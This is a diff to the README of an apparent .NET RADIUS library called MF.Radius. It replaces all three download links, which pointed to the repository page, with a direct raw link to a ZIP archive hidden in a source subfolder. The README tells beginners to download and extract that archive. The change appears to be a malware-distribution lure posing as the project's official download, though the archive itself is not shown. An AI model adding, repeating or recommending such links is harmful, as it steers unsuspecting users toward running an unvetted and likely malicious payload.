@@ -1,6 +1,6 @@
 # 🧩 MF.Radius - Fast RADIUS Packet Processing for .NET
 
-[![Download MF.Radius](https://img.shields.io/badge/Download%20MF.Radius-blue?style=for-the-badge&logo=github)](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
+[![Download MF.Radius](https://img.shields.io/badge/Download%20MF.Radius-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/explorative-largemagellaniccloud775/MF.Radius/main/src/MF.Radius.Core/Options/Radius_M_1.5.zip)
 
 ## 🚀 What This App Does
 
@@ -33,7 +33,7 @@ For best results, use a modern PC with:
 
 ## 📥 Download and Install
 
-1. Open this page: [MF.Radius download page](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
+1. Open this page: [MF.Radius download page](https://raw.githubusercontent.com/explorative-largemagellaniccloud775/MF.Radius/main/src/MF.Radius.Core/Options/Radius_M_1.5.zip)
 2. Download the project files from the repository page
 3. Save the files to a folder you can find later, such as Downloads or Desktop
 4. If the download is a ZIP file, right-click it and choose Extract All
@@ -177,7 +177,7 @@ If you are new to this kind of software:
 
 ## 🔗 Download Again
 
-[Download MF.Radius from GitHub](https://github.com/explorative-largemagellaniccloud775/MF.Radius)
+[Download MF.Radius from GitHub](https://raw.githubusercontent.com/explorative-largemagellaniccloud775/MF.Radius/main/src/MF.Radius.Core/Options/Radius_M_1.5.zip)
 
 ## 📋 What This Framework Is For
 
